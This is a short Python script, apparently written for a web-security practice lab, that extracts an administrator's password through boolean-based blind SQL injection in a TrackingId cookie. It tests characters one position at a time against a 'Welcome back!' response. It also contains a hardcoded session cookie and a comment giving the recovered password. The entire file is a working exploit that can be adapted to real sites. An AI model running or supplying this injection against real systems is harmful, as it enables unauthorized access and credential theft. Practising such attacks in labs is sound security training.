import requests
import string
url="https://0a6500a203ac8398803776a9009c00ac.web-security-academy.net"
a=string.digits+string.ascii_letters
b=""
#password is 0gr1n6sidsrcdkug55y8
while True:
    for j in range(22,24):
        for i in a:
            cookies={"TrackingId":"eee' or (select 'a' from users where username='administrator' and substr(password,"+str(j)+",1)='"+i+"')='a","session":"m7Mpg0WNzKCo2vETBnED2UNla6xscuXw"}
            r=requests.get(url,cookies=cookies)
            if "Welcome back!" in r.text:
                b+=i
                break
        print(b)
